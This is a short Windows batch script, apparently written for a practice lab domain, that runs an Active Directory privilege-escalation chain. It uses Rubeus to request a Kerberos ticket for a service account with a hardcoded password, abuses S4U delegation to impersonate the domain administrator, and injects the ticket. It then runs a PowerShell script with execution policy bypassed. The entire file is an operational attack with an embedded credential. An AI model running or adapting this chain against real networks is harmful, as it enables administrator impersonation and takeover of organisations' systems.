@echo off
REM CD-chain: Kerberoast(known pw) -> S4U2Self/S4U2Proxy as Administrator -> present ST to AdminService
C:\Tools\ADTools\Rubeus.exe asktgt /user:svc_sccm /password:s3rv1c3_SCCM! /domain:range.local /dc:192.168.77.12 /enctype:aes256 /outfile:C:\Tools\cadre-attack\cd-tgt.kirbi
C:\Tools\ADTools\Rubeus.exe s4u /ticket:C:\Tools\cadre-attack\cd-tgt.kirbi /impersonateuser:administrator /msdsspn:HTTP/mbr02.range.local /dc:192.168.77.12 /ptt /outfile:C:\Tools\cadre-attack\cd-st.kirbi
powershell -ExecutionPolicy Bypass -File C:\Tools\cadre-attack\cd-present.ps1
